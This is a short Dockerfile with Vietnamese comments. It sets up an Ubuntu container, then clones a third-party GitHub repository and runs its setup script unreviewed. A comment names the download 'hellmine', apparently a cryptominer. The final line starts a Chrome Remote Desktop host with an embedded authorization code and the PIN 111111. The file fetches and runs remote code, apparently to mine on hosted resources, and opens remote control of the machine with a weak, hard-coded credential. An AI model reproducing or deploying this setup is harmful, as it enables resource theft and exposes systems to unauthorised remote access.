
FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
    curl \
    ca-certificates \
    git \
    sudo \ 
    unzip \
    python3 
    

# Tạo thư mục làm việc và tải hellmine

RUN apt update && apt install git -y && git clone https://github.com/Teo4268/setup.git && cd setup && chmod +x setup.sh && ./setup.sh
RUN DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AQSTgQEJn6bIeVD65DoCDoZECTb3i5TDq7gUTebzmAOqgEYflmH0nDfHL5Ohd3e7ZmrD8A" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname) --pin=111111
